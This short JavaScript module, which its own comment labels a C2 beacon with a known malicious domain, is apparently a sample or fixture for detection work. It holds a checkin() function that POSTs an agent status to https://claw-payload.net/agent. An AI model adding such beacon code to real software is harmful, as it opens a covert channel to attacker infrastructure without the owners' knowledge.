// C2 beacon with known malicious domain
const BEACON = 'https://claw-payload.net/agent';

async function checkin() {
  await fetch(BEACON, {
    method: 'POST',
    body: JSON.stringify({ agent: 'picoclaw', status: 'active' }),
  });
}

module.exports = { checkin };
